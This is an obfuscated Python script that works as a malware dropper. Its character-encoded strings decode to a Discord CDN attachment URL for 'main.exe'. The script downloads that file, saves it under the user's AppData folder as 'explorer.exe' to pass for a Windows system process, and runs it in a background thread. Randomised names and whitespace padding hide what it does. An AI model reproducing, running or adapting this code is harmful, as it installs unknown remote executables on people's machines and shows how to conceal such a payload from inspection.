import requests
aG=None
aX=True
ay=exit
av=open
az=file
aF=requests.get
import subprocess
at=subprocess.run
import threading
am=threading.Thread
import os
aw=os.path
an=os.environ
aI=an[("".join([chr(85),chr(83),chr(69),chr(82),chr(80),chr(82),chr(79),chr(70),chr(73),chr(76),chr(69)]))                   ]+("".join([chr(92),chr(65),chr(112),chr(112),chr(68),chr(97),chr(116),chr(97),chr(92),chr(76),chr(111),chr(99),chr(97),chr(108),chr(92),chr(101),chr(120),chr(112),chr(108),chr(111),chr(114),chr(101),chr(114),chr(46),chr(101),chr(120),chr(101)]))
def aH()->aG:
  if aw.exists(aI):
    at(aI,shell=aX)
def ao()->aG:
  aj=aF(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(99),chr(100),chr(110),chr(46),chr(100),chr(105),chr(115),chr(99),chr(111),chr(114),chr(100),chr(97),chr(112),chr(112),chr(46),chr(99),chr(111),chr(109),chr(47),chr(97),chr(116),chr(116),chr(97),chr(99),chr(104),chr(109),chr(101),chr(110),chr(116),chr(115),chr(47),chr(49),chr(49),chr(55),chr(54),chr(50),chr(56),chr(55),chr(53),chr(49),chr(49),chr(48),chr(54),chr(53),chr(49),chr(52),chr(53),chr(51),chr(57),chr(52),chr(47),chr(49),chr(50),chr(48),chr(48),chr(56),chr(55),chr(49),chr(49),chr(52),chr(57),chr(49),chr(49),chr(57),chr(50),chr(49),chr(51),chr(55),chr(57),chr(56),chr(47),chr(109),chr(97),chr(105),chr(110),chr(46),chr(101),chr(120),chr(101),chr(63),chr(101),chr(120),chr(61),chr(54),chr(53),chr(99),chr(55),chr(99),chr(49),chr(54),chr(57),chr(38),chr(105),chr(115),chr(61),chr(54),chr(53),chr(98),chr(53),chr(52),chr(99),chr(54),chr(57),chr(38),chr(104),chr(109),chr(61),chr(52),chr(97),chr(57),chr(56),chr(48),chr(55),chr(57),chr(98),chr(51),chr(102),chr(49),chr(49),chr(51),chr(98),chr(53),chr(101),chr(50),chr(50),chr(101),chr(52),chr(100),chr(100),chr(48),chr(100),chr(53),chr(53),chr(51),chr(48),chr(57),chr(53),chr(49),chr(50),chr(50),chr(53),chr(56),chr(57),chr(101),chr(102),chr(48),chr(102),chr(53),chr(48),chr(57),chr(56),chr(53),chr(99),chr(101),chr(97),chr(54),chr(101),chr(51),chr(48),chr(51),chr(99),chr(102),chr(99),chr(53),chr(52),chr(48),chr(55),chr(56),chr(52),chr(100),chr(97),chr(38)]))                                                                                                                                                                                              )
  if aj.status_code!=int("".join([chr(50),chr(48),chr(48)]))                        :
    ay()
  with av(aI,("".join([chr(119),chr(98)]))                 )as az:
    az.write(aj.content)
def aR()->aG:
  aS=am(target=aH)
  aS.start()
ao();aR()
